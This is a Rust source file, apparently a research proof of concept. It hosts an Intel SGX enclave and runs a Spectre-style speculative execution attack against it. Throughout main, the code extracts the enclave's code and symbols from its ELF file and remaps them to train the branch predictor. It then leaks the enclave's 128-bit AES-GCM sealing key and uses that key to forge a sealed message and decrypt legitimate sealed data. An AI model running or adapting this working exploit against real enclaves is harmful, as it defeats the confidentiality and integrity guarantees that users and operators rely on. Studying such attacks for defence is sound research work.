// Licensed to the Apache Software Foundation (ASF) under one
// or more contributor license agreements.  See the NOTICE file
// distributed with this work for additional information
// regarding copyright ownership.  The ASF licenses this file
// to you under the Apache License, Version 2.0 (the
// "License"); you may not use this file except in compliance
// with the License.  You may obtain a copy of the License at
//
//   http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing,
// software distributed under the License is distributed on an
// "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
// KIND, either express or implied.  See the License for the
// specific language governing permissions and limitations
// under the License..

#![feature(asm)]

extern crate sgx_types;
extern crate sgx_urts;

use sgx_types::*;
use sgx_urts::SgxEnclave;

extern crate minidow;
use minidow::*;

extern crate capstone;
use capstone::prelude::*;

extern crate nix;
#[cfg(not(feature = "multithread"))]
use nix::sched::{sched_setaffinity, CpuSet};
use nix::sys::mman::{mmap, mprotect, MapFlags, ProtFlags};
#[cfg(not(feature = "multithread"))]
use nix::unistd::Pid;

extern crate libc;
use libc::c_void;

extern crate aes_gcm;
use aes_gcm::aead::{generic_array::GenericArray, Aead, NewAead, Payload};
use aes_gcm::Aes128Gcm;

extern crate termcolor;
use termcolor::{Color, ColorChoice, ColorSpec, StandardStream, WriteColor};

static ENCLAVE_FILE: &'static str = "enclave1.signed.so";

extern "C" {
    fn Enclave1_get_secret_addr(eif: sgx_enclave_id_t, retval: *mut uint64_t) -> sgx_status_t;
    fn Enclave1_get_key_addr(eif: sgx_enclave_id_t, retval: *mut uint64_t) -> sgx_status_t;
    fn Enclave1_custom_seal_data(
        eif: sgx_enclave_id_t,
        retval: *mut sgx_status_t,
        buf: *const u8,
        buf_size: u32,
        out_buf: *mut u8,
        out_size: *mut u32,
        out_tag: *mut sgx_aes_gcm_128bit_tag_t,
    ) -> sgx_status_t;
    fn Enclave1_custom_unseal_data(
        eif: sgx_enclave_id_t,
        retval: *mut sgx_status_t,
        buf: *const u8,
        buf_size: u32,
        out_buf: *mut u8,
        tag: *const sgx_aes_gcm_128bit_tag_t,
    ) -> sgx_status_t;
    fn Enclave1_spectre_test(
        eif: sgx_enclave_id_t,
        measurement_array_addr: u64,
        target_addr: u64,
    ) -> sgx_status_t;
}

fn init_enclave() -> SgxResult<SgxEnclave> {
    let mut launch_token: sgx_launch_token_t = [0; 1024];
    let mut launch_token_updated: i32 = 0;
    let debug = 0;
    let mut misc_attr = sgx_misc_attribute_t {
        secs_attr: sgx_attributes_t { flags: 0, xfrm: 0 },
        misc_select: 0,
    };
    SgxEnclave::create(
        ENCLAVE_FILE,
        debug,
        &mut launch_token,
        &mut launch_token_updated,
        &mut misc_attr,
    )
}

static mut ENCLAVE: SgxEnclave =
    unsafe { std::mem::transmute([1u8; std::mem::size_of::<SgxEnclave>()]) };
static mut TARGET: usize = 0;

fn main() -> std::io::Result<()> {
    #[cfg(not(feature = "multithread"))]
    {
        let mut cpuset = CpuSet::new();
        cpuset.set(1).unwrap();
        sched_setaffinity(Pid::from_raw(0), &cpuset).unwrap();
    }

    let mut stdout = StandardStream::stdout(ColorChoice::AlwaysAnsi);

    unsafe {
        let tmp_enclave = match init_enclave() {
            Ok(r) => {
                println!("Init Enclave Successful: enclave ID is {}!", r.geteid());
                r
            }
            Err(x) => {
                return Err(std::io::Error::new(
                    std::io::ErrorKind::Other,
                    format!("Init Enclave Failed: {}!", x.as_str()),
                ));
            }
        };

        std::ptr::copy(
            &tmp_enclave as *const SgxEnclave,
            &mut ENCLAVE as *mut SgxEnclave,
            1,
        );
        std::mem::forget(tmp_enclave);
    }

    stdout.set_color(ColorSpec::new().set_fg(Some(Color::Green)))?;
    println!("Retrieving the address of a symbol from the enclave");
    stdout.set_color(ColorSpec::new().set_fg(Some(Color::White)))?;

    let mut secret_full_addr = 0;

    let result = unsafe { Enclave1_get_secret_addr(ENCLAVE.geteid(), &mut secret_full_addr) };
    if result != sgx_status_t::SGX_SUCCESS {
        return Err(std::io::Error::new(
            std::io::ErrorKind::Other,
            format!("ECALL Enclave Failed: {}!", result.as_str()),
        ));
    }

    println!("Got addr 0x{:x}", secret_full_addr);

    let cs = Capstone::new()
        .x86()
        .mode(arch::x86::ArchMode::Mode64)
        .syntax(arch::x86::ArchSyntax::Intel)
        .detail(true)
        .build()
        .expect("Failed to create Capstone object");

    stdout.set_color(ColorSpec::new().set_fg(Some(Color::Green)))?;
    println!("Parsing the enclave file");
    stdout.set_color(ColorSpec::new().set_fg(Some(Color::White)))?;

    // read the file, parse the elf, and extract the code of the targetted function (+ perform the
    // relocation to take care of the layout randomisation)
    let enclave_binary = std::fs::read(ENCLAVE_FILE)?;

    let elf = match goblin::elf::Elf::parse(&enclave_binary) {
        Ok(elf) => elf,
        Err(e) => {
            return Err(std::io::Error::new(
                std::io::ErrorKind::Other,
                format!("invalid file format, expected an elf binary: {:?}", e),
            ))
        }
    };

    let mut minidow_secret_sym = goblin::elf::Sym::default();
    let mut secret_sym = goblin::elf::Sym::default();
    let mut spectre_limit_sym = goblin::elf::Sym::default();

    let mut access_memory_spectre_offset = 0;
    let mut access_memory_spectre_size = 0;

    let mut spectre_test_offset = 0;
    let mut spectre_test_size = 0;
    let mut spectre_test_got_addr = 0;

    for sym in elf.syms.iter() {
        let symbol_name = elf.strtab.get(sym.st_name).unwrap().unwrap();
        if symbol_name == "MINIDOW_SECRET" {
            minidow_secret_sym = sym;
        } else if symbol_name == "SECRET" {
            secret_sym = sym;
        } else if symbol_name == "SPECTRE_LIMIT" {
            spectre_limit_sym = sym;
        } else if symbol_name == "access_memory_spectre" {
            access_memory_spectre_offset = sym.st_value as usize;
            access_memory_spectre_size = sym.st_size as usize;
        } else if symbol_name == "spectre_test" {
            spectre_test_offset = sym.st_value as usize;
            spectre_test_size = sym.st_size as usize;

            let asm_code =
                &enclave_binary[spectre_test_offset..spectre_test_offset + spectre_test_size];

            println!("function code: {:?}", asm_code);
            let insns = cs
                .disasm_all(asm_code, sym.st_value)
                .expect("Failed to disassemble");

            // we expect an instruction in the likes of "jmp qword ptr [rip + 0x234a2]"
            let jmp = insns.iter().next().unwrap();
            if jmp.mnemonic() != Some("jmp") {
                panic!("Invalid instruction in spectre_test");
            }
            let details = cs.insn_detail(&jmp).unwrap();
            println!("{:?}", details);
            let operands = details.arch_detail().operands();
            println!("{:?}", operands);
            if let capstone::arch::ArchOperand::X86Operand(capstone::arch::x86::X86Operand {
                op_type: capstone::arch::x86::X86OperandType::Mem(mem_op),
                ..
            }) = operands[0]
            {
                spectre_test_got_addr =
                    jmp.address() as usize + jmp.bytes().len() + mem_op.disp() as usize;
            }
        }
    }

    stdout.set_color(ColorSpec::new().set_fg(Some(Color::Green)))?;
    println!("Remapping training code to clobber the BTB");
    stdout.set_color(ColorSpec::new().set_fg(Some(Color::White)))?;

    println!(
        "access_memory_spectre_offset: 0x{:x}",
        access_memory_spectre_offset
    );

    let base_32bit_offset = (secret_full_addr - secret_sym.st_value) & ((1 << 32) - 1);
    println!("base_32bit_offset: 0x{:x}", base_32bit_offset);

    // map in memory and add a jump at the correct adress
    // see the SgxSpectre paper for more details on why we simulate only the last 32 bits of
    // addresses
    // note that this isn't really 4GB is size because of the relation we perform by adding
    // base_32bit_offset, so we would be better off not using the end of this array ;)
    let mapped_array: &mut [u8; 1 << 32] = unsafe {
        let addr = mmap(
            0 as *mut c_void,
            1 << 33,
            ProtFlags::PROT_WRITE | ProtFlags::PROT_READ,
            MapFlags::MAP_PRIVATE | MapFlags::MAP_ANONYMOUS,
            -1,
            0,
        )
        .unwrap();
        println!("Mmapped 8GB of memory at {:p}", addr);

        let mut aligned_addr = (addr as usize + (1 << 32)) & (!((1 << 32) - 1));
        aligned_addr += base_32bit_offset as usize;

        std::mem::transmute(aligned_addr)
    };

    let top_32bit_offset = (secret_full_addr
        - (mapped_array as *const u8 as u64 + secret_sym.st_value))
        & (!((1 << 32) - 1));
    println!("top_32bit_offset: 0x{:x}", top_32bit_offset);

    println!("Training array allocated at {:p}", mapped_array as *const _);

    let data_offset_file = elf.section_headers[minidow_secret_sym.st_shndx].sh_offset as i64
        - elf.section_headers[minidow_secret_sym.st_shndx].sh_addr as i64;
    let minidow_secret_array_rela_addr = unsafe {
        *(&enclave_binary[(data_offset_file + minidow_secret_sym.st_value as i64) as usize
            ..(data_offset_file + minidow_secret_sym.st_value as i64 + 8) as usize]
            as *const _ as *const usize)
    };
    let spectre_limit_addr = top_32bit_offset as usize
        + mapped_array as *const _ as usize
        + spectre_limit_sym.st_value as usize;
    println!("spectre_limit_addr: 0x{:x}", spectre_limit_addr);

    let minidow_secret_array_addr_in_enclave = minidow_secret_array_rela_addr as i64
        + mapped_array as *const _ as i64
        + top_32bit_offset as i64;
    println!(
        "Minidow_secret adress inside the enclave: 0x{:x}",
        minidow_secret_array_addr_in_enclave
    );

    let spectre_test_training_fun: unsafe extern "C" fn(
        measurement_array_addr: usize,
        target_addr: usize,
    ) = unsafe {
        let dst_addr = &mapped_array[access_memory_spectre_offset] as *const _ as usize;

        std::ptr::copy(
            &enclave_binary[access_memory_spectre_offset] as *const u8,
            dst_addr as *mut u8,
            access_memory_spectre_size,
        );

        // copy the spectre_test function
        std::ptr::copy(
            &enclave_binary[spectre_test_offset] as *const u8,
            &mut mapped_array[spectre_test_offset],
            spectre_test_size,
        );
        // spectre test calls a function stored in the GOT, so let's add the relocated adress of
        // access_memory_spectre there
        *(&mut mapped_array[spectre_test_got_addr] as *mut _ as *mut usize) = dst_addr as usize;

        // we need to add the statics too if we want the function to work well
        std::ptr::copy(
            minidow::MINIDOW_SECRET as *const u8,
            &mut mapped_array[minidow_secret_sym.st_value as usize],
            minidow_secret_sym.st_size as usize,
        );
        std::ptr::copy(
            &enclave_binary[secret_sym.st_value as usize] as *const u8,
            &mut mapped_array[secret_sym.st_value as usize],
            secret_sym.st_size as usize,
        );
        for i in 0..128 {
            *((minidow_secret_array_rela_addr as usize + mapped_array as *const _ as usize + i)
                as *mut u8) = b'0';
        }

        // I'm not sadistic enough to put the function in RWX memory.
        let map_rx = |addr: usize, size: usize| {
            println!(
                "Mapping {} bytes as executable at {:p}",
                size, addr as *const u8
            );
            mprotect(
                // align on a page boundary
                (addr & (!((1 << 12) - 1))) as *mut c_void,
                size + (addr & ((1 << 12) - 1)),
                ProtFlags::PROT_READ | ProtFlags::PROT_EXEC,
            )
            .unwrap();
        };
        map_rx(dst_addr as usize, access_memory_spectre_size);
        map_rx(
            &mapped_array[spectre_test_offset] as *const _ as usize,
            spectre_test_size,
        );

        std::mem::transmute(&mapped_array[spectre_test_offset])
    };

    stdout.set_color(ColorSpec::new().set_fg(Some(Color::Green)))?;
    println!("Setting up an environment for exploiting spectre");
    stdout.set_color(ColorSpec::new().set_fg(Some(Color::White)))?;

    setup_measurements();
    // yay, training is now possible!

    unsafe extern "C" fn spectre_test_ecall(base_addr: usize, off: usize) {
        //*((base_addr + minidow::MULTIPLE_OFFSET) as *mut u8) = 123;
        let result = Enclave1_spectre_test(ENCLAVE.geteid(), base_addr as u64, off as u64);
        if result != sgx_status_t::SGX_SUCCESS {
            println!("ECALL Enclave Failed: {}!", result.as_str());
        }
    }

    let result =
        unsafe { Enclave1_get_key_addr(ENCLAVE.geteid(), &mut TARGET as *mut _ as *mut u64) };
    if result != sgx_status_t::SGX_SUCCESS {
        return Err(std::io::Error::new(
            std::io::ErrorKind::Other,
            format!("ECALL Enclave Failed: {}!", result.as_str()),
        ));
    }

    let message_str = "Do Not Go Gentle Into That Good Night00000000000";
    let message = message_str.as_bytes();
    let mut sealed_message = vec![0; 512];
    let mut sealed_message_len: u32 = 0;
    let mut out_tag = sgx_aes_gcm_128bit_tag_t::default();

    stdout.set_color(ColorSpec::new().set_fg(Some(Color::Green)))?;
    println!("Asking the enclave to seal the message \"{}\"", message_str);
    stdout.set_color(ColorSpec::new().set_fg(Some(Color::White)))?;

    let mut status = sgx_status_t::SGX_SUCCESS;
    stdout.set_color(ColorSpec::new().set_fg(Some(Color::Cyan)))?;
    println!("\x1b[F");
    let result = unsafe {
        Enclave1_custom_seal_data(
            ENCLAVE.geteid(),
            &mut status as *mut _,
            &message[0] as *const u8,
            message.len() as u32,
            sealed_message.as_mut_ptr(),
            &mut sealed_message_len as *mut _,
            &mut out_tag as *mut _,
        )
    };
    stdout.set_color(ColorSpec::new().set_fg(Some(Color::White)))?;
    if result != sgx_status_t::SGX_SUCCESS {
        return Err(std::io::Error::new(
            std::io::ErrorKind::Other,
            format!("ECALL Enclave Failed: {}!", result.as_str()),
        ));
    }
    println!("AES-GCM encryption: {}", status);

    println!("Our speculative target is: 0x{:x}", unsafe { TARGET });

    let spectre = Spectre::new(
        Some(spectre_test_training_fun),
        Some(spectre_test_ecall),
        Some((minidow_secret_array_addr_in_enclave as usize + 64) as *const i8),
        Some(spectre_limit_addr as *const u8),
    );

    let key_part_1 = minidow::read_ptr(
        &spectre,
        || unsafe {
            // try to prefetch, in the hoep it will help
            std::arch::x86_64::_mm_prefetch(TARGET as *const i8, std::arch::x86_64::_MM_HINT_T0);
        },
        unsafe { TARGET },
    );
    let key_part_2 = minidow::read_ptr(
        &spectre,
        || unsafe {
            // try to prefetch, in the hoep it will help
            std::arch::x86_64::_mm_prefetch(
                (TARGET + 8) as *const i8,
                std::arch::x86_64::_MM_HINT_T0,
            );
        },
        unsafe { TARGET + 8 },
    );

    let pkey_val = ((key_part_2 as u128) << 64) | key_part_1 as u128;
    stdout.set_color(ColorSpec::new().set_fg(Some(Color::Red)))?;
    println!("Got private key: 0x{:x}", pkey_val);
    stdout.set_color(ColorSpec::new().set_fg(Some(Color::White)))?;

    let mut res_message = vec![0; 512];

    let aad = &sealed_message[sealed_message_len as usize
        - std::mem::size_of::<sgx_types::sgx_key_id_t>()
        ..sealed_message_len as usize];

    let nonce = GenericArray::from_slice(&[0; 12]);
    let pkey = GenericArray::from(unsafe { std::mem::transmute::<u128, [u8; 16]>(pkey_val) });
    let cipher = Aes128Gcm::new(&pkey);

    stdout.set_color(ColorSpec::new().set_fg(Some(Color::Green)))?;
    println!("Sealing a fake message");
    stdout.set_color(ColorSpec::new().set_fg(Some(Color::White)))?;

    let fake_message = b"fake message !!!";
    let payload = Payload {
        msg: fake_message,
        aad,
    };

    let ciphertext = cipher.encrypt(nonce, payload).unwrap();
    let mut tag: sgx_types::sgx_aes_gcm_128bit_tag_t =
        sgx_types::sgx_aes_gcm_128bit_tag_t::default();
    for i in 0..16 {
        tag[i] = ciphertext[ciphertext.len() - 16 + i];
    }
    let mut ciphertext = ciphertext[..ciphertext.len() - 16].to_owned();
    ciphertext.extend(aad);

    stdout.set_color(ColorSpec::new().set_fg(Some(Color::Cyan)))?;
    println!("\x1b[F");
    let result = unsafe {
        Enclave1_custom_unseal_data(
            ENCLAVE.geteid(),
            &mut status as *mut _,
            ciphertext.as_ptr(),
            fake_message.len() as u32,
            res_message.as_mut_ptr(),
            &tag as *const _,
        )
    };
    stdout.set_color(ColorSpec::new().set_fg(Some(Color::White)))?;
    if result != sgx_status_t::SGX_SUCCESS {
        return Err(std::io::Error::new(
            std::io::ErrorKind::Other,
            format!("ECALL Enclave Failed: {}!", result.as_str()),
        ));
    }
    println!("unsealing by enclave: {}", status);

    stdout.set_color(ColorSpec::new().set_fg(Some(Color::Red)))?;
    println!("Deciphered by the enclave: {}", unsafe {
        String::from_utf8_unchecked(res_message)
    });

    stdout.set_color(ColorSpec::new().set_fg(Some(Color::Green)))?;
    println!("Unsealing a legitimate message");
    stdout.set_color(ColorSpec::new().set_fg(Some(Color::White)))?;

    let mut sealed_message_owned = sealed_message
        [0..sealed_message_len as usize - std::mem::size_of::<sgx_types::sgx_key_id_t>()]
        .to_owned();
    sealed_message_owned.extend(&out_tag[0..16]);
    let payload = Payload {
        msg: sealed_message_owned.as_slice(),
        aad,
    };
    let deciphered = cipher.decrypt(nonce, payload).unwrap();

    stdout.set_color(ColorSpec::new().set_fg(Some(Color::Red)))?;
    println!("Deciphered by the app: {}", unsafe {
        String::from_utf8_unchecked(deciphered)
    });

    unsafe {
        std::mem::take(&mut ENCLAVE).destroy();
    }

    Ok(())
}
